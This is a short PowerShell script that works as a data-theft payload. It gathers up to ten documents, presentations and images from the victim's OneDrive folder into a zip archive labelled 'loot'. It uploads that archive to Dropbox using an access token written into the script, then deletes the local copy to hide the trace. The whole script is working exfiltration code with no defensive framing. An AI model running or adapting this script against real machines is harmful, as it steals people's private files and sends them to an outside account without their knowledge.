function Upload-DropBox() {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]$SourceFilePath
    ) 
    $dropBoxAccessToken = "sl.BnfXo3mXip6fuk5QCSgm4NJo_hIm-D0bBY7_gn4gO7Yx7vm6KCXIpZV0NfP3bhXDGnZ_RzMZO-xyHuxW-uahoA0QCE8TcOEPNeZqM1kjdfAnJF_hBL8QmgFvQZdrT_VhNuP6wdT5HvYMfPw"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $targetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $dropBoxAccessToken
    $authHeaders = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $authHeaders.Add("Authorization", $authorization)
    $authHeaders.Add("Dropbox-API-Arg", $arg)
    $authHeaders.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $authHeaders
}

$computerName = $env:COMPUTERNAME

if (Test-Path $env:OneDrive) {
    $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
    $getLoot | Compress-Archive -DestinationPath "$env:TEMP\imabdk-loot-$computerName.zip" -Update
}

if (Test-Path "$env:TEMP\imabdk-loot-$computerName.zip") {
    Upload-DropBox -SourceFilePath "$env:TEMP\imabdk-loot-$computerName.zip"
    Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
}
